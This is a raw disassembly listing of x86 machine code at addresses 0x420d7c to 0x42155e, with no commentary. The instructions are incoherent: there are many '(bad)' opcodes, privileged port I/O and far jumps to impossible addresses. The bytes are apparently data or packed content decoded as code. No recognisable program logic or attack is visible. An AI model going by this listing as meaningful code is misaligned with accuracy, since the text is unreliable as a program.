  420d7c:	and    esi,DWORD PTR [ebp+0xc]
  420d7f:	ror    DWORD PTR [ebx+0x6b],0x1a
  420d83:	imul   ecx,DWORD PTR [edi+0xa],0x193cae10
  420d8a:	hlt    
  420d8b:	mov    eax,0xa9a01bbb
  420d90:	pop    edi
  420d91:	inc    edi
  420d92:	xchg   esp,eax
  420d93:	xor    dl,dl
  420d95:	push   eax
  420d96:	cld    
  420d97:	add    DWORD PTR [eax-0x396c1af9],eax
  420d9d:	dec    edx
  420d9e:	sub    DWORD PTR [edi+0x67],esp
  420da1:	stos   DWORD PTR es:[edi],eax
  420da2:	jecxz  0x420e1a
  420da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420da5:	xor    BYTE PTR [eax-0x55515674],dl
  420dab:	arpl   WORD PTR [ebp-0x13ab6587],bp
  420db1:	adc    ch,BYTE PTR [esi+0x13]
  420db4:	sahf   
  420db5:	push   ecx
  420db6:	repnz cmp BYTE PTR [ecx+0x2d],0xe5
  420dbb:	mov    edi,0x5daf9b98
  420dc0:	and    DWORD PTR [edi+edx*1+0x62],ebx
  420dc4:	jae    0x420def
  420dc6:	or     BYTE PTR ds:0xa258b396,al
  420dcc:	xlat   BYTE PTR ds:[ebx]
  420dcd:	scas   eax,DWORD PTR es:[edi]
  420dce:	psrld  mm4,QWORD PTR [ecx+0xe]
  420dd2:	shl    DWORD PTR ds:0x6ccd735,1
  420dd8:	push   esi
  420dd9:	push   cs
  420dda:	(bad)  
  420ddb:	std    
  420ddc:	retf   0x9eb7
  420ddf:	out    dx,eax
  420de0:	in     eax,0xc8
  420de2:	icebp  
  420de3:	(bad)  
  420de4:	imul   BYTE PTR [edi-0x1d]
  420de7:	call   0x431c:0x881c5499
  420dee:	loop   0x420dd4
  420df0:	stc    
  420df1:	xchg   ebx,eax
  420df2:	jle    0x420d7c
  420df4:	cli    
  420df5:	sub    DWORD PTR [edi+eiz*1],ebx
  420df8:	push   ds
  420df9:	push   ecx
  420dfa:	nop
  420dfb:	xor    eax,0x546379fa
  420e00:	inc    esi
  420e01:	sbb    BYTE PTR [ebp-0x208b3bc4],bl
  420e07:	leave  
  420e08:	cmp    DWORD PTR ds:0xda586e8f,esp
  420e0e:	dec    edi
  420e0f:	and    ecx,esp
  420e11:	add    dh,ah
  420e13:	cmp    esi,ebp
  420e15:	push   ecx
  420e16:	cmp    bh,BYTE PTR [esi-0x4a]
  420e19:	jae    0x420ddc
  420e1b:	mov    ecx,0x89de1738
  420e20:	jno    0x420e8a
  420e22:	lock aam 0xa
  420e25:	in     al,0xc6
  420e27:	repz and eax,0x49ccffa6
  420e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e2e:	cli    
  420e2f:	test   DWORD PTR ds:0xf69cfbc8,eax
  420e35:	xchg   esp,eax
  420e36:	in     eax,0x89
  420e38:	sbb    eax,0x5d857e3f
  420e3d:	bound  ecx,QWORD PTR [ebx-0x2]
  420e40:	adc    dl,BYTE PTR [eax-0x7]
  420e43:	test   DWORD PTR fs:[ecx+0x20],esp
  420e47:	leave  
  420e48:	cs stos BYTE PTR es:[edi],al
  420e4a:	xor    BYTE PTR [edi+0x65],ah
  420e4d:	in     al,dx
  420e4e:	es adc esi,ebx
  420e51:	inc    ebx
  420e52:	std    
  420e53:	cmp    ecx,ecx
  420e55:	(bad)  
  420e56:	shr    BYTE PTR [ebp-0x74b7f850],cl
  420e5c:	sub    BYTE PTR [esi-0x62e7202b],0x15
  420e63:	rcl    BYTE PTR [ebx-0x16f1e3ca],1
  420e69:	mov    esp,0x8ceacaa0
  420e6e:	or     ch,dl
  420e70:	loop   0x420e51
  420e72:	icebp  
  420e73:	push   esp
  420e74:	(bad)  
  420e76:	fbstp  TBYTE PTR [esi+0x20]
  420e79:	cli    
  420e7a:	jae    0x420eeb
  420e7c:	jbe    0x420e34
  420e7e:	cmp    eax,0x51f6d825
  420e83:	gs lahf 
  420e85:	push   cs
  420e86:	cmp    BYTE PTR [ecx-0x708786d9],bh
  420e8c:	icebp  
  420e8d:	inc    edi
  420e8e:	cmc    
  420e8f:	mov    edx,gs
  420e91:	xor    al,0x8f
  420e93:	dec    esi
  420e94:	push   ebx
  420e95:	lds    esp,FWORD PTR [esi-0x6d]
  420e98:	pop    es
  420e99:	mov    ebp,0x2e515893
  420e9e:	sbb    BYTE PTR [ebp-0x56],0x3f
  420ea2:	push   ss
  420ea3:	cmp    al,0xb
  420ea5:	push   esp
  420ea6:	push   ebp
  420ea7:	lahf   
  420ea8:	ja     0x420f11
  420eaa:	jae    0x420e69
  420eac:	push   edx
  420ead:	pop    edx
  420eae:	or     edx,DWORD PTR [ecx+esi*8+0xf]
  420eb2:	and    DWORD PTR [edi+ecx*8],esi
  420eb5:	outs   dx,BYTE PTR ds:[esi]
  420eb6:	push   0xea02dfdc
  420ebb:	ins    BYTE PTR es:[edi],dx
  420ebc:	mov    ds:0xe9fb6a37,al
  420ec1:	pop    eax
  420ec2:	cld    
  420ec3:	push   eax
  420ec4:	and    eax,0xb016dc5f
  420ec9:	lds    edx,FWORD PTR [ebx+0x9161fcc]
  420ecf:	cli    
  420ed0:	lea    ebp,[eax]
  420ed2:	cmp    dh,BYTE PTR fs:[esp+esi*2-0x2b1fc709]
  420eda:	mov    dh,0x4c
  420edc:	jns    0x420f41
  420ede:	lods   eax,DWORD PTR ds:[esi]
  420edf:	test   al,0xa0
  420ee1:	scas   eax,DWORD PTR es:[edi]
  420ee2:	add    al,0x35
  420ee4:	or     BYTE PTR [ebx+0x13177fb7],bh
  420eea:	push   ds
  420eeb:	sub    DWORD PTR [ecx+0x25fa238c],ecx
  420ef1:	sbb    BYTE PTR [ecx-0x5e122c4c],cl
  420ef7:	test   DWORD PTR [eax-0x69eade7f],esi
  420efd:	mov    dh,0xc0
  420eff:	loope  0x420f22
  420f01:	int    0xb5
  420f03:	shl    esi,cl
  420f05:	inc    eax
  420f06:	sub    dh,cl
  420f08:	in     eax,0x92
  420f0a:	add    BYTE PTR ds:0x49a3bcbe,bh
  420f10:	push   ecx
  420f11:	bnd js 0x420eae
  420f14:	sub    edi,edi
  420f16:	pop    ebp
  420f17:	xchg   si,ax
  420f19:	int3   
  420f1a:	retf   0x3e09
  420f1d:	jecxz  0x420f5c
  420f1f:	outs   dx,DWORD PTR ds:[esi]
  420f20:	xchg   edi,eax
  420f21:	sahf   
  420f22:	dec    ecx
  420f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f24:	push   es
  420f25:	call   0x4e8bff46
  420f2a:	add    eax,0x1586e142
  420f2f:	adc    BYTE PTR [esi],0xec
  420f32:	mov    ah,0x7f
  420f34:	into   
  420f35:	repz jg 0x420f8b
  420f38:	cld    
  420f39:	pop    edx
  420f3a:	adc    eax,0xbe7144fb
  420f3f:	or     edx,DWORD PTR [edi]
  420f41:	inc    edi
  420f42:	inc    edi
  420f43:	jecxz  0x420f0b
  420f45:	mov    ds,WORD PTR [ebx-0x2461721c]
  420f4b:	mov    ch,bh
  420f4d:	(bad)  
  420f4e:	fs cs xchg esi,eax
  420f51:	test   al,0xa0
  420f53:	mov    ecx,0x6d26c7cb
  420f58:	ret    
  420f59:	sub    esi,DWORD PTR [ecx+eiz*8]
  420f5c:	sbb    DWORD PTR [ecx],edi
  420f5e:	cmp    eax,0x775fada1
  420f63:	lea    ebp,[esi]
  420f65:	retf   0x55ea
  420f68:	xchg   ebp,eax
  420f69:	(bad)
  420f6c:	xchg   edi,eax
  420f6d:	mov    ds:0x9182d07b,eax
  420f72:	fmul   st,st(3)
  420f74:	xor    DWORD PTR [esi+edx*1+0x648d721b],ecx
  420f7b:	lahf   
  420f7c:	out    0x9a,al
  420f7e:	std    
  420f7f:	jne    0x420f19
  420f81:	pop    edi
  420f82:	inc    edi
  420f83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f84:	mov    dh,0x9f
  420f86:	cmp    BYTE PTR [ebx+0x67145357],dl
  420f8c:	pop    esp
  420f8d:	test   ch,ch
  420f8f:	stos   DWORD PTR es:[edi],eax
  420f90:	jmp    0x420fa1
  420f92:	fucom  st(5)
  420f94:	adc    eax,0xd32ff8c4
  420f99:	and    esp,DWORD PTR [ebp-0x54]
  420f9c:	fadd   st,st(6)
  420f9e:	and    DWORD PTR [ebp-0x2f],edx
  420fa1:	test   BYTE PTR [ebx],ch
  420fa3:	in     al,0x1d
  420fa5:	into   
  420fa6:	inc    edi
  420fa7:	mov    bh,ch
  420fa9:	mov    al,0xac
  420fab:	in     eax,0xb5
  420fad:	mov    dl,0xe3
  420faf:	aam    0x5c
  420fb1:	sub    DWORD PTR [ebx],edi
  420fb3:	cmp    ch,BYTE PTR [eax]
  420fb5:	jp     0x420fb6
  420fb7:	mov    bl,0xac
  420fb9:	mov    BYTE PTR [ebp-0x20],dl
  420fbc:	iret   
  420fbd:	xor    eax,0x79755efd
  420fc2:	(bad)
  420fc5:	inc    ebx
  420fc6:	adc    al,BYTE PTR [esi]
  420fc8:	retf   0x2bb6
  420fcb:	repnz mov ah,0x57
  420fce:	xchg   BYTE PTR cs:[esi+0x71924895],bl
  420fd5:	and    BYTE PTR [edi],cl
  420fd7:	sbb    eax,0x4bcfaa17
  420fdc:	scas   al,BYTE PTR es:[edi]
  420fdd:	pop    edx
  420fde:	or     eax,0xa01a0b52
  420fe3:	pop    ebx
  420fe4:	mov    bl,BYTE PTR [ebp-0x1a]
  420fe7:	test   BYTE PTR [ebx],bh
  420fe9:	ins    DWORD PTR es:[edi],dx
  420fea:	test   al,0xf3
  420fec:	xor    edi,ebp
  420fee:	or     al,0xdc
  420ff0:	sub    DWORD PTR es:[edx],0xad00fef0
  420ff7:	dec    ecx
  420ff8:	es js  0x421078
  420ffb:	stos   BYTE PTR es:[edi],al
  420ffc:	mov    ecx,0x7c58db3e
  421001:	push   es
  421002:	(bad)  [ebx-0x2d]
  421005:	out    0x1d,al
  421007:	mov    cl,0x5
  421009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42100a:	icebp  
  42100b:	sub    eax,0x714d081
  421010:	aas    
  421011:	mov    ds:0xf31c399a,al
  421016:	cwde   
  421017:	daa    
  421018:	shl    BYTE PTR [esi+0x3700e990],cl
  42101e:	lds    ebp,FWORD PTR [ebx-0x66aea900]
  421024:	xlat   BYTE PTR ds:[ebx]
  421025:	mov    eax,ds:0x2338b34a
  42102a:	cs fcmovne st,st(0)
  42102d:	dec    edi
  42102e:	call   0xddf7:0x7eff5336
  421035:	mov    dh,0x6d
  421037:	sub    esi,edx
  421039:	mov    WORD PTR [ebx],cs
  42103b:	dec    eax
  42103c:	cdq    
  42103d:	xor    edi,DWORD PTR [edi+edi*8]
  421040:	xchg   edi,eax
  421041:	nop
  421042:	fidiv  WORD PTR [ebx+0x62]
  421045:	xor    ebp,edi
  421047:	xchg   BYTE PTR [ebx],bl
  421049:	je     0x42101d
  42104b:	out    0xb2,al
  42104d:	in     al,0xb7
  42104f:	pop    eax
  421050:	ja     0x42106b
  421052:	aas    
  421053:	dec    edi
  421054:	shr    BYTE PTR [ebx-0x5ae2cfd3],0x81
  42105b:	pop    es
  42105c:	adc    BYTE PTR [ecx-0x4be0fb1c],ah
  421062:	mov    esi,esi
  421064:	fwait
  421065:	cmp    bh,al
  421067:	pushf  
  421068:	jle    0x420feb
  42106a:	cld    
  42106b:	ja     0x421001
  42106d:	sbb    bh,bl
  42106f:	inc    esi
  421070:	dec    BYTE PTR [ecx]
  421072:	jne    0xba50c6df
  421078:	jp     0x421089
  42107a:	push   0x649b5deb
  42107f:	mov    al,ds:0x745ce24a
  421084:	adc    esi,DWORD PTR [edx+0x7c]
  421087:	pop    ebp
  421088:	and    eax,0x11895d84
  42108d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42108e:	inc    edi
  42108f:	fild   DWORD PTR [ebp+0x69]
  421092:	aad    0x46
  421094:	jle    0x4210a2
  421096:	jo     0x42107d
  421098:	popa   
  421099:	add    dl,cl
  42109b:	or     DWORD PTR ds:0x70fcbb2b,0x2000471a
  4210a5:	xchg   ebp,eax
  4210a6:	dec    esi
  4210a7:	sbb    edi,DWORD PTR [ebp-0x60]
  4210aa:	in     al,0x40
  4210ac:	(bad)  
  4210ad:	lea    eax,[esi+eiz*8+0x61]
  4210b1:	xchg   ebp,eax
  4210b2:	lods   eax,DWORD PTR ds:[esi]
  4210b3:	adc    DWORD PTR [ebx+0x32ca1275],ebx
  4210b9:	stos   BYTE PTR es:[edi],al
  4210ba:	mov    al,ds:0x595c049
  4210bf:	dec    ebx
  4210c0:	push   0xdc728d49
  4210c5:	int    0x41
  4210c7:	or     DWORD PTR [ecx],edi
  4210c9:	lods   eax,DWORD PTR ds:[esi]
  4210ca:	mul    BYTE PTR [eax+0x5d]
  4210cd:	adc    BYTE PTR [ebx],ah
  4210cf:	add    BYTE PTR [eax-0x3de9df8a],bl
  4210d5:	loopne 0x42109e
  4210d7:	inc    ebx
  4210d8:	or     esi,DWORD PTR [edi-0x42]
  4210db:	jmp    0x2b10ab36
  4210e0:	lock mov esp,0xb615fc14
  4210e6:	jmp    0x83088789
  4210eb:	int    0xce
  4210ed:	outs   dx,BYTE PTR ds:[esi]
  4210ee:	push   ds
  4210ef:	xchg   BYTE PTR [ebx],cl
  4210f1:	leave  
  4210f2:	or     eax,0x34869b1e
  4210f7:	(bad)  
  4210f8:	popf   
  4210f9:	rcr    BYTE PTR [ecx+0x1d0b467a],cl
  4210ff:	or     dl,cl
  421101:	push   0x747750aa
  421106:	js     0x4210b3
  421108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421109:	sbb    BYTE PTR [edx-0x4],dl
  42110c:	fidivr DWORD PTR [esp+ebx*1]
  42110f:	mov    eax,ds:0x823b4c13
  421114:	(bad)  
  421115:	aam    0x67
  421117:	(bad)  
  421118:	sub    eax,0x62bf9d28
  42111d:	pop    ds
  42111e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42111f:	pop    ds
  421120:	rol    DWORD PTR [eax+0x16],cl
  421123:	je     0x565536c2
  421129:	test   edx,esi
  42112b:	inc    esp
  42112c:	or     dh,BYTE PTR [ebx+ecx*4+0x78109dd2]
  421133:	xchg   DWORD PTR [ebp+0x4f],eax
  421136:	aam    0xcc
  421138:	pop    ebx
  421139:	push   ss
  42113a:	dec    ebp
  42113b:	sahf   
  42113c:	retf   0xca8c
  42113f:	cwde   
  421140:	add    al,ah
  421142:	loopne 0x42114e
  421144:	jmp    0x8ac6d437
  421149:	cmp    eax,0x8f510768
  42114e:	add    BYTE PTR [edi+0x758fb5dd],bl
  421154:	iret   
  421155:	xor    eax,0x1149b0a2
  42115a:	(bad)  
  42115b:	mov    dh,0x76
  42115d:	inc    ecx
  42115e:	jo     0x4211c9
  421160:	mov    DWORD PTR [esi-0x3306d46d],esi
  421166:	imul   esp,DWORD PTR [ecx-0x31c8941a],0xffffffc8
  42116d:	and    DWORD PTR [ebp+0x7a],ebx
  421170:	es push ecx
  421172:	or     BYTE PTR [esi+0xe28f3fe],bh
  421178:	pop    ebp
  421179:	jmp    0x3848a107
  42117e:	or     dh,BYTE PTR [edi+ecx*4+0x563dd4e6]
  421185:	mov    ch,0xa4
  421187:	enter  0xe13f,0x5a
  42118b:	lods   eax,DWORD PTR ds:[esi]
  42118c:	or     DWORD PTR [ecx+ecx*4],ecx
  42118f:	ins    BYTE PTR es:[edi],dx
  421190:	fidiv  WORD PTR [eax-0x50]
  421193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421194:	xchg   ebp,esi
  421196:	fisubr WORD PTR [ecx]
  421198:	jmp    0x924b7546
  42119d:	and    eax,0xcc2e24b5
  4211a2:	dec    ebx
  4211a3:	pop    ss
  4211a4:	and    al,0x4
  4211a6:	in     eax,0x8b
  4211a8:	and    eax,DWORD PTR ds:0x5c0696ad
  4211ae:	pop    ss
  4211af:	cmp    DWORD PTR [ecx+eax*4+0x76],esi
  4211b3:	in     al,0x6f
  4211b5:	jp     0x42120f
  4211b7:	or     eax,0x65e319e1
  4211bc:	lock push ss
  4211be:	dec    edx
  4211bf:	ret    
  4211c0:	sub    bl,al
  4211c2:	int3   
  4211c3:	sbb    ebx,ebx
  4211c5:	pop    ecx
  4211c6:	pop    DWORD PTR [edx+esi*2]
  4211c9:	arpl   cx,sp
  4211cb:	in     al,0xef
  4211cd:	(bad)  
  4211cf:	test   al,0xa5
  4211d1:	sub    eax,0x5d4990b6
  4211d6:	jge    0x421161
  4211d8:	jp     0x4211e5
  4211da:	xor    eax,0xa51a85fa
  4211df:	pop    ss
  4211e0:	retf   
  4211e1:	retf   
  4211e2:	sti    
  4211e3:	js     0x4211fb
  4211e5:	xchg   ecx,eax
  4211e6:	xor    edi,DWORD PTR [eax-0x44]
  4211e9:	aas    
  4211ea:	aaa    
  4211eb:	shl    BYTE PTR [ebx],cl
  4211ed:	push   0xf88ed427
  4211f2:	inc    esi
  4211f3:	shl    BYTE PTR ds:0x4bed1892,cl
  4211f9:	sbb    ecx,DWORD PTR [edx-0xd75d891]
  4211ff:	lea    ebp,[eax+0x1f]
  421202:	inc    esp
  421203:	add    bh,dh
  421205:	ins    BYTE PTR es:[edi],dx
  421206:	and    DWORD PTR [edi-0x66],edi
  421209:	arpl   WORD PTR [esi-0x6e],bp
  42120c:	push   0x7d262321
  421211:	lds    ecx,FWORD PTR [edi-0x1618986]
  421217:	or     eax,0x8e418140
  42121c:	mov    bh,0x7
  42121e:	fidiv  DWORD PTR [ecx]
  421220:	into   
  421221:	jmp    0x241b276e
  421226:	xor    BYTE PTR fs:[ecx],dh
  421229:	test   eax,0xa35fdb2c
  42122e:	arpl   WORD PTR gs:[edi+0x11],sp
  421232:	mov    ds:0xb9f6ffd3,al
  421237:	in     al,0x53
  421239:	or     BYTE PTR [esi+0x2ab0864c],cl
  42123f:	pop    eax
  421240:	dec    ebx
  421241:	cmp    ecx,eax
  421243:	and    DWORD PTR [ebx+0x2e270c41],esi
  421249:	pop    esp
  42124a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42124b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42124c:	xlat   BYTE PTR ds:[ebx]
  42124d:	pop    esi
  42124e:	les    esi,FWORD PTR [ecx]
  421250:	jecxz  0x4212a9
  421252:	out    0xa5,eax
  421254:	push   esi
  421255:	daa    
  421256:	cmc    
  421257:	das    
  421258:	inc    ebx
  421259:	iret   
  42125a:	pop    ebx
  42125b:	(bad)  
  42125c:	stc    
  42125d:	cli    
  42125e:	xchg   DWORD PTR [edi+ecx*4],eax
  421261:	(bad)
  421264:	mov    ecx,0x96cd71d3
  421269:	xor    eax,0x65e70b09
  42126e:	into   
  42126f:	xchg   ebx,eax
  421270:	xor    al,0x58
  421272:	jge    0x421245
  421274:	shr    BYTE PTR ds:0xc76e3c2f,cl
  42127a:	sub    al,0xf9
  42127c:	jns    0x4212de
  42127e:	dec    eax
  42127f:	xor    ecx,ecx
  421281:	mov    ah,0xb0
  421283:	sbb    cl,BYTE PTR [ecx+0x14c3a623]
  421289:	xor    DWORD PTR [eax+0x221293f6],0x24c7c448
  421293:	inc    esi
  421294:	(bad)  
  421295:	popa   
  421296:	sbb    al,0x8d
  421298:	(bad)  
  421299:	repnz stos BYTE PTR es:[edi],al
  42129b:	mov    fs,WORD PTR [edi]
  42129d:	sub    DWORD PTR ds:[edx-0xd],edx
  4212a1:	icebp  
  4212a2:	cwde   
  4212a3:	scas   eax,DWORD PTR es:[edi]
  4212a4:	int3   
  4212a5:	enter  0x75ea,0x9e
  4212a9:	mov    ch,0xa1
  4212ab:	inc    eax
  4212ac:	lods   eax,DWORD PTR ds:[esi]
  4212ad:	mov    ds:0x866e8d18,al
  4212b2:	jae    0x421286
  4212b4:	adc    BYTE PTR [esi],ch
  4212b6:	mov    ebx,es
  4212b8:	shl    ebp,1
  4212ba:	or     al,BYTE PTR [edi]
  4212bc:	nop
  4212bd:	mov    eax,ds:0x40a98aa4
  4212c2:	jns    0x421293
  4212c4:	imul   esi,DWORD PTR [ecx+edx*4-0x5a],0xf3aa4514
  4212cc:	retf   
  4212cd:	jmp    0xac68ee3c
  4212d2:	jl     0x421320
  4212d4:	jge    0x421285
  4212d6:	inc    ecx
  4212d7:	ins    BYTE PTR es:[edi],dx
  4212d8:	pop    esi
  4212d9:	test   al,0x18
  4212db:	es sbb al,0x7a
  4212de:	inc    ecx
  4212df:	jp     0x4212b7
  4212e1:	or     ebp,DWORD PTR [edi-0x119113f6]
  4212e7:	pushf  
  4212e8:	rcl    ah,0xe8
  4212eb:	mov    esi,0x9a03be31
  4212f0:	pop    esp
  4212f1:	aad    0x10
  4212f3:	loop   0x42131a
  4212f5:	sub    esi,0xb24cee9f
  4212fb:	xchg   esi,eax
  4212fc:	fs mov bh,0xda
  4212ff:	das    
  421300:	lahf   
  421301:	arpl   di,di
  421303:	sahf   
  421304:	adc    DWORD PTR [edi-0x339eeae2],ebp
  42130a:	add    ch,BYTE PTR [edi-0x46]
  42130d:	mov    eax,ds:0x4977f11c
  421312:	loope  0x421377
  421314:	mov    ebp,0x8ed23f59
  421319:	adc    edi,DWORD PTR [esi-0x45]
  42131c:	dec    esp
  42131d:	loop   0x42131b
  42131f:	dec    esi
  421320:	icebp  
  421321:	ffreep st(5)
  421323:	xchg   edx,eax
  421324:	inc    ebp
  421325:	push   0xe5dab3d7
  42132a:	xchg   edx,eax
  42132b:	mov    dh,ah
  42132d:	(bad)  
  42132e:	mov    cl,0xdb
  421330:	pop    ds
  421331:	xchg   BYTE PTR [eax],cl
  421333:	add    DWORD PTR [eax-0x517a789d],0x320bf88
  42133d:	fstp   QWORD PTR [ebp+0x79c27bc4]
  421343:	or     DWORD PTR [ebx+edx*8-0x5534732e],esi
  42134a:	(bad)  
  42134b:	sub    BYTE PTR [edx],bl
  42134d:	xor    al,0x39
  42134f:	shr    DWORD PTR [ecx+0x46],cl
  421352:	jae    0x4213d0
  421354:	out    0xd3,al
  421356:	xor    al,0xcf
  421358:	sahf   
  421359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42135a:	loopne 0x4213a5
  42135c:	sbb    dh,BYTE PTR [edi+0xcdf686d]
  421362:	pusha  
  421363:	xchg   edi,eax
  421364:	add    al,0x51
  421366:	mov    BYTE PTR [eax+0x1b],cl
  421369:	push   0x6f
  42136b:	xchg   BYTE PTR [eax+0x9805049],bl
  421371:	adc    al,0x28
  421374:	fsubrp st(5),st
  421376:	stos   BYTE PTR es:[edi],al
  421377:	leave  
  421378:	repz sbb al,0xa9
  42137b:	jne    0x4213df
  42137d:	mov    cl,0xf9
  42137f:	(bad)  
  421380:	xchg   esi,eax
  421381:	pop    edx
  421382:	mov    ch,0x80
  421384:	xchg   esp,eax
  421385:	setl   BYTE PTR [ebx+0x7a]
  421389:	push   edi
  42138a:	mov    ecx,0x306066ab
  42138f:	mov    dh,0xc5
  421391:	pop    es
  421392:	test   BYTE PTR [ebx+0x2626cf2f],bh
  421398:	ins    BYTE PTR es:[edi],dx
  421399:	mov    DWORD PTR [edx-0x7e],0xf4a4faf8
  4213a0:	outs   dx,DWORD PTR ds:[esi]
  4213a1:	xchg   edi,eax
  4213a2:	mov    ecx,eax
  4213a4:	lods   al,BYTE PTR ds:[esi]
  4213a5:	sahf   
  4213a6:	and    al,0x68
  4213a8:	xor    BYTE PTR [edi+ebx*2],0x29
  4213ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213ad:	bound  edx,QWORD PTR ds:0x4191ff66
  4213b3:	xor    al,0x77
  4213b5:	or     BYTE PTR [edi],al
  4213b7:	fnstcw WORD PTR [esi-0x2d]
  4213ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213bb:	and    DWORD PTR [edx],0xdf90b5e1
  4213c1:	and    BYTE PTR [eax-0x78],0x90
  4213c5:	imul   edi,DWORD PTR [ebx-0x4f10847d],0x2d
  4213cc:	jno    0x42137d
  4213ce:	mov    edx,0x4d78e7a2
  4213d3:	into   
  4213d4:	out    dx,eax
  4213d5:	jecxz  0x42141c
  4213d7:	and    eax,0x738c1401
  4213dc:	aam    0xb7
  4213de:	pusha  
  4213df:	mov    edi,esp
  4213e1:	scas   al,BYTE PTR es:[edi]
  4213e2:	dec    ebx
  4213e3:	and    DWORD PTR [edi-0x24e9b80d],esi
  4213e9:	lods   eax,DWORD PTR ds:[esi]
  4213ea:	inc    edx
  4213eb:	stos   BYTE PTR es:[di],al
  4213ed:	jge    0x4213f8
  4213ef:	mov    ds:0x7e26114f,al
  4213f4:	pop    ebx
  4213f5:	mov    bh,0xae
  4213f7:	cld    
  4213f8:	or     al,0xfd
  4213fa:	fs fst st(6)
  4213fd:	daa    
  4213fe:	out    0x68,al
  421400:	cld    
  421401:	jmp    FWORD PTR [ebx-0x7d]
  421404:	rcl    ebp,1
  421406:	add    BYTE PTR [edi+0x3fd66f1e],0x44
  42140d:	cdq    
  42140e:	dec    edx
  42140f:	add    cl,BYTE PTR [eax+0x5a]
  421412:	pop    ss
  421413:	sbb    DWORD PTR [ebx-0x74102d8c],edi
  421419:	stc    
  42141a:	jecxz  0x42144d
  42141c:	jns    0x42145e
  42141e:	inc    ebp
  42141f:	or     dh,BYTE PTR [esi+0x5ad84707]
  421425:	mov    esp,0xb083f35a
  42142a:	outs   dx,BYTE PTR ds:[esi]
  42142b:	ds daa 
  42142d:	pop    edx
  42142e:	int3   
  42142f:	popf   
  421430:	xlat   BYTE PTR ds:[ebx]
  421431:	and    al,0x8b
  421433:	xchg   ebx,eax
  421434:	jb     0x421428
  421436:	repnz and esi,DWORD PTR [edi]
  421439:	push   cs
  42143a:	faddp  st(6),st
  42143c:	fs inc eax
  42143e:	out    dx,eax
  42143f:	add    al,0x46
  421441:	push   es
  421442:	shl    DWORD PTR [esi+0x4d],0x1d
  421446:	je     0x421466
  421448:	inc    ebp
  421449:	jb     0x42141a
  42144b:	test   BYTE PTR [edi-0x547c542],0xa8
  421452:	out    0xcf,al
  421454:	out    0x17,eax
  421456:	nop
  421457:	ror    DWORD PTR [eax+ebp*4-0x3a16de81],1
  42145e:	xchg   edx,eax
  42145f:	dec    ecx
  421460:	pusha  
  421461:	inc    esi
  421462:	out    dx,eax
  421463:	jne    0x42143e
  421465:	and    ch,al
  421467:	scas   eax,DWORD PTR es:[edi]
  421468:	neg    edi
  42146a:	repnz push eax
  42146c:	or     eax,ecx
  42146e:	push   esp
  42146f:	push   0x51
  421471:	add    bh,dl
  421473:	sbb    ecx,DWORD PTR [ebp-0x721929c]
  421479:	pop    ecx
  42147a:	push   ecx
  42147b:	rcr    DWORD PTR [edx-0x151a9036],1
  421481:	dec    esp
  421482:	push   edx
  421483:	fadd   DWORD PTR [ebp+0x3c]
  421486:	cmp    esi,DWORD PTR [eax]
  421488:	mov    ds:0xca39c488,al
  42148d:	cdq    
  42148e:	add    cl,ch
  421490:	mov    bh,0xe5
  421492:	and    BYTE PTR cs:0x7294e365,ch
  421499:	push   dx
  42149b:	push   cs
  42149c:	and    al,0xd1
  42149e:	hlt    
  42149f:	addr16 stc 
  4214a1:	test   BYTE PTR [ebp+0x1579cf0],0x63
  4214a8:	sahf   
  4214a9:	and    esi,DWORD PTR [ebx+eiz*8+0x37463ee5]
  4214b0:	xor    eax,ecx
  4214b2:	mov    eax,0xc1861a25
  4214b7:	xchg   BYTE PTR [ebx+0x50],cl
  4214ba:	add    ch,dl
  4214bc:	mov    bh,0x57
  4214be:	inc    esi
  4214bf:	loop   0x421474
  4214c1:	jns    0x42153e
  4214c3:	mov    ebp,0x377ef786
  4214c8:	mov    esi,0xb1118d5c
  4214cd:	call   0x7b31:0x4f3ba523
  4214d4:	add    al,0xa8
  4214d6:	fsubr  DWORD PTR [esp+ebx*2+0x51ac31ed]
  4214dd:	adc    al,0x62
  4214df:	scas   al,BYTE PTR es:[edi]
  4214e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214e1:	sub    bh,BYTE PTR [ebx+0x723b07b2]
  4214e7:	pop    eax
  4214e8:	pushf  
  4214e9:	mov    eax,0x16c3da60
  4214ee:	icebp  
  4214ef:	ret    
  4214f0:	(bad)  
  4214f2:	icebp  
  4214f3:	loop   0x4214b5
  4214f5:	and    ch,BYTE PTR ds:0xe663d24f
  4214fb:	sbb    BYTE PTR [edi*4-0x7cfb01df],dl
  421502:	fs call 0xe0db:0xa954d8e6
  42150a:	les    ebx,FWORD PTR [ebx-0x41645d7b]
  421510:	pop    ebp
  421511:	pusha  
  421512:	pop    ebx
  421513:	add    al,0x2d
  421515:	cwde   
  421516:	mov    esi,0xa989a297
  42151b:	cmp    al,0x90
  42151d:	cmp    eax,0xb1868ccc
  421522:	inc    edx
  421523:	outs   dx,BYTE PTR ds:[esi]
  421524:	xchg   esp,eax
  421525:	or     al,0x4a
  421527:	std    
  421528:	push   esi
  421529:	je     0x421552
  42152b:	and    esi,DWORD PTR [ebx+ebx*2-0x21]
  42152f:	push   esp
  421530:	push   eax
  421531:	cmp    ah,BYTE PTR [ebp-0x3ab20e74]
  421537:	adc    DWORD PTR [ebx],edx
  421539:	fxtract 
  42153b:	add    BYTE PTR [eax],ah
  42153d:	(bad)  
  42153e:	xlat   BYTE PTR ds:[ebx]
  42153f:	test   DWORD PTR [esi+0x516edd86],ebp
  421545:	adc    DWORD PTR [edx-0x3c],edi
  421548:	mov    esp,0x217daca3
  42154d:	push   es
  42154e:	stc    
  42154f:	mov    esi,0xe10971e4
  421554:	adc    al,0xe2
  421556:	sahf   
  421557:	jmp    FWORD PTR [ecx-0x78addd9b]
  42155d:	fwait
  42155e:	dec    eax
